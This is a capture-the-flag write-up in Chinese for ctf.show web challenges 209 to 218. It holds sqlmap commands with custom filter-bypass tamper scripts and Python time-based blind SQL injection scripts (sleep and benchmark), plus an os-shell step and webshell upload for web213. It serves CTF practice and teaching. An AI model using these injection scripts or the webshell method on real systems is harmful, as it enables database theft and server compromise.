<h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   //TODO 未完工</span><br><span class="line">   return preg_match('/ |\*|\=/', $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>多过滤了*号和=号，我们在上面的脚本多加一个匹配=号换like</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;e83f1efc-354e-42c0-8c2e-ca9eafd2f81d.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --batch --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --threads&#x3D;10 --cookie&#x3D;&quot;PHPSESSID&#x3D;hnfvub4a2sfnmofk3g7r28vc39; ctfshow&#x3D;72a5a5bfd041b4dc7fac9cfa9f868db6&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;e83f1efc-354e-42c0-8c2e-ca9eafd2f81d.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;mycomment  -D ctfshow_web -T ctfshow_flav --dump</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Author:孤桜懶契</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">"By孤桜懶契-空格替换制表符0x09,=号换like"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">space2comment</span><span class="params">(payload)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += chr(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'\''</span>:</span><br><span class="line">                    quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'"'</span>:</span><br><span class="line">                    doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'='</span>:</span><br><span class="line">                    retVal += chr(<span class="number">0x09</span>) + <span class="string">'like'</span> + chr(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">"*"</span>:</span><br><span class="line">                retVal += chr(<span class="number">0x31</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">" "</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                    retVal += chr(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;对查询字符进行解密</span><br><span class="line">  function decode($id)&#123;</span><br><span class="line">    return strrev(base64_decode(strrev(base64_decode($id))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>先对字符串进行64解码，然后再反转字符，再套一层，我们写个相反就的行了</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Author:孤桜懶契</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">"By孤桜懶契-base编码两次-反转两次"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    payload = encode(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.replace(<span class="string">" "</span>,chr(<span class="number">0x09</span>))</span><br><span class="line">        retVal = retVal.encode()</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;6848c055-1297-4397-8dc0-d2477ea293db.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --batch --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --threads&#x3D;10 --cookie&#x3D;&quot;PHPSESSID&#x3D;hnfvub4a2sfnmofk3g7r28vc39; ctfshow&#x3D;72a5a5bfd041b4dc7fac9cfa9f868db6&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;6848c055-1297-4397-8dc0-d2477ea293db.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;my</span><br></pre></td></tr></table></figure></div>

<h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><blockquote>
<ul>
<li>和上题一样，过滤了空格号，不影响，我上个代码中写了替换空格为0x09也就是制表符</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u "http://6848c055-1297-4397-8dc0-d2477ea293db.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://6848c055-1297-4397-8dc0-d2477ea293db.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=my -D ctfshow_web -T ctfshow_flavia --dump</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><blockquote>
<ul>
<li>和上题一样过滤多加了个*不影响我们</li>
</ul>
</blockquote>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;2b123cfd-31cd-465e-b7cb-1e1470122ae4.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --batch --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --threads&#x3D;10 --cookie&#x3D;&quot;PHPSESSID&#x3D;hnfvub4a2sfnmofk3g7r28vc39; ctfshow&#x3D;72a5a5bfd041b4dc7fac9cfa9f868db6&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;2b123cfd-31cd-465e-b7cb-1e1470122ae4.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;my  -T ctfshow_web -T  ctfshow_flavis --dump</span><br></pre></td></tr></table></figure></div>

<h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><blockquote>
<ul>
<li>这题需要getshell，因为过滤的和上题一样，就用我那个过滤脚本</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Author:孤桜懶契</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">"By孤桜懶契-base编码两次-反转两次"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    payload = encode(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.replace(<span class="string">" "</span>,chr(<span class="number">0x09</span>))</span><br><span class="line">        retVal = retVal.encode()</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p><strong>然后接着我们进行getshell上传一个上传点</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://6309ef18-4721-4f5c-919d-bf47c71c749e.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://6309ef18-4721-4f5c-919d-bf47c71c749e.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=my --os-shell</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731164027857.png" alt="image-20210731164027857"></p>
<p><strong>上传一句话木马，蚁剑连接</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731164139622.png" alt="image-20210731164139622"></p>
<p><strong>在根目录下有flag</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731164205840.png" alt="image-20210731164205840"></p>
<h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><blockquote>
<ul>
<li>时间盲注，直接脚本跑</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://5eb465ee-6eeb-4508-9fea-5496e3ad2a8f.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890qwertyuiopasdfghjklzxcvbnm&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = "if(substr(database(),&#123;&#125;,1)='&#123;&#125;',sleep(3),0)"</span></span><br><span class="line"><span class="comment">#payload = "if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',sleep(5),0)"</span></span><br><span class="line"><span class="comment">#payload = "if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagx'),&#123;&#125;,1)='&#123;&#125;',sleep(5),0)"</span></span><br><span class="line">payload = <span class="string">"if(substr((select group_concat(flaga) from ctfshow_flagx),&#123;&#125;,1)='&#123;&#125;',sleep(5),0)"</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end - start)</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">4.9</span> <span class="keyword">and</span> end - start &lt; <span class="number">6.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731173410636.png" alt="image-20210731173410636"></p>
</blockquote>
<h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><blockquote>
<ul>
<li>题目提示说加了单引号，我们就闭合掉，改一下上面的代码，继续跑</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://fed15780-e37b-48e2-8e96-86d984f46b94.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查数据库payload = "1' or if(substr(database(),&#123;&#125;,1)='&#123;&#125;',sleep(3),0) #"</span></span><br><span class="line"><span class="comment">#查表payload = "1' or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',sleep(3),0) #"</span></span><br><span class="line"><span class="comment">#查字段payload = "1' or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxc'),&#123;&#125;,1)='&#123;&#125;',sleep(3),0) #"</span></span><br><span class="line">payload = <span class="string">"1' or if(substr((select group_concat(flagaa) from ctfshow_flagxc),&#123;&#125;,1)='&#123;&#125;',sleep(3),0) #"</span></span><br><span class="line"><span class="comment">#payload = "if(substr((select group_concat(flaga) from ctfshow_flagx),&#123;&#125;,1)='&#123;&#125;',sleep(5),0)"</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">2.9</span> <span class="keyword">and</span> end - start &lt; <span class="number">4.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">where id &#x3D; from_base64($id);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>加了个base64解密，所以我们用“MQ==”–&gt;1 所以就会算是true，这题没单引号，所以改一下上一题代码。</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://83e21d02-6e3a-4c01-9016-79367bdcb966.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#'MQ==' or if(1=1,sleep(5),0)</span></span><br><span class="line"><span class="comment">#payload = "'MQ==' or if(substr(database(),&#123;&#125;,1)='&#123;&#125;',sleep(5),0) "</span></span><br><span class="line"><span class="comment">#payload = "'MQ==' or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',sleep(5),0) "</span></span><br><span class="line"><span class="comment">#payload = "'MQ==' or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxcc'),&#123;&#125;,1)='&#123;&#125;',sleep(5),0) "</span></span><br><span class="line">payload = <span class="string">"'MQ==' or if(substr((select group_concat(flagaac) from ctfshow_flagxcc),&#123;&#125;,1)='&#123;&#125;',sleep(5),0) "</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">4.9</span> <span class="keyword">and</span> end - start &lt; <span class="number">6.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731182828100.png" alt="image-20210731182828100"></p>
<h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;屏蔽危险分子</span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F;sleep&#x2F;i&#39;,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>过滤了sleep,可以换一个函数benchmark(6666666,sha(1))</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">benchmark(6666666,sha(1))</span><br><span class="line">第一个参数指的是执行次数、第二参数指的是执行语句</span><br></pre></td></tr></table></figure></div>

<p><strong>将上一个payload改一下，跑一下就出来了，因为是执行次数来确定延时时间，所以也跟你家网速波动有关系，适当调试，我控制在一个1.4ms到4.9ms，应该能保证普通网速的，如果你网速超快，适当调整</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = "http://fe186d5a-2385-43fd-8d4a-d557cc25b038.challenge.ctf.show:<span class="number">8080</span>//api/<span class="string">"</span></span><br><span class="line"><span class="string">str = "</span><span class="number">01234567890</span>abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，<span class="string">"</span></span><br><span class="line"><span class="string">flag = ""</span></span><br><span class="line"><span class="string">#1 or if(substr(database(),&#123;&#125;,1)='&#123;&#125;',benchmark(6666666,sha(1)),0)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#payload = "</span><span class="number">1</span> <span class="keyword">or</span> <span class="keyword">if</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),&#123;&#125;,<span class="number">1</span>)=<span class="string">'&#123;&#125;'</span>,<span class="keyword">benchmark</span>(<span class="number">6666666</span>,<span class="keyword">sha</span>(<span class="number">1</span>)),<span class="number">0</span>)<span class="string">"</span></span><br><span class="line"><span class="string">#payload = "</span><span class="number">1</span>) <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),&#123;&#125;,<span class="number">1</span>)=<span class="string">'&#123;&#125;'</span>,<span class="keyword">benchmark</span>(<span class="number">5000000</span>,<span class="keyword">sha</span>(<span class="number">1</span>)),<span class="number">0</span>) <span class="comment">#"</span></span><br><span class="line"><span class="comment">#payload = "1) and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxccb'),&#123;&#125;,1)='&#123;&#125;',benchmark(5000000,sha(1)),0) #"</span></span><br><span class="line">payload = <span class="string">"1) and if(substr((select group_concat(flagaabc) from ctfshow_flagxccb),&#123;&#125;,1)='&#123;&#125;',benchmark(5000000,sha(1)),0) #"</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">str</span>:</span><br><span class="line">        <span class="keyword">data</span> = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">start</span> = time.time()</span><br><span class="line">        res = requests.post(<span class="keyword">url</span>, <span class="keyword">data</span>)</span><br><span class="line">        <span class="keyword">end</span> = time.time()</span><br><span class="line">        <span class="comment"># print(end-start)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">end</span> - <span class="keyword">start</span> &gt; <span class="number">1.4</span> <span class="keyword">and</span> <span class="keyword">end</span> - <span class="keyword">start</span> &lt; <span class="number">4.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                <span class="keyword">exit</span>()</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731193548774.png" alt="image-20210731193548774"></p>
<h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><blockquote>
<ul>
<li>这题过滤了benchmark，不过还有RLIKE REGEXP正则匹配</li>
</ul>
</blockquote>
